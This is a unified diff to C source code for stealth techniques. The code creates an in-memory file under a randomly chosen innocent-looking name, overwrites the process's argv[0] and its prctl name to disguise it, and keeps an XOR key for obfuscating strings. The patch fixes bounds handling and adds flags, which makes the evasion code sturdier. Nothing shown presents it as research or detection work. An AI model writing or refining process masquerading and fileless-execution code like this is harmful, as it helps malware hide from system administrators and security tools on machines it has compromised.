@@ -2,6 +2,10 @@
 #include <string.h>
 #include <time.h>
 
+#ifndef MFD_CLOEXEC
+#define MFD_CLOEXEC 0x0001U
+#endif
+
 __attribute__((used))
 volatile uint8_t g_str_xor_key = 0x5A;
 
@@ -72,20 +76,26 @@ const char* get_random_innocent_name(void) {
 }
 
 int create_masqueraded_memfd(void) {
+#ifdef HARMLESS_TEST_MEMFD_ENOSYS
+    return -ENOSYS;
+#else
     const char* name = get_random_innocent_name();
-    return syscall2(__NR_memfd_create, (long)name, 0);
+    return syscall2(__NR_memfd_create, (long)name, MFD_CLOEXEC);
+#endif
 }
 
 void hide_process_title(int argc, char* argv[]) {
     if (argc > 0 && argv && argv[0]) {
         size_t orig_len = strlen(argv[0]);
-        memset(argv[0], 0, orig_len);
         const char* name = get_random_innocent_name();
-        size_t copy_len = strlen(name);
-        if (copy_len >= orig_len)
-            copy_len = orig_len - 1;
-        memcpy(argv[0], name, copy_len);
-        argv[0][copy_len] = '\0';
+        if (orig_len > 0) {
+            size_t copy_len = strlen(name);
+            memset(argv[0], 0, orig_len);
+            if (copy_len >= orig_len)
+                copy_len = orig_len - 1;
+            memcpy(argv[0], name, copy_len);
+            argv[0][copy_len] = '\0';
+        }
         syscall3(__NR_prctl, PR_SET_NAME, (long)name, 0);
     }
 }
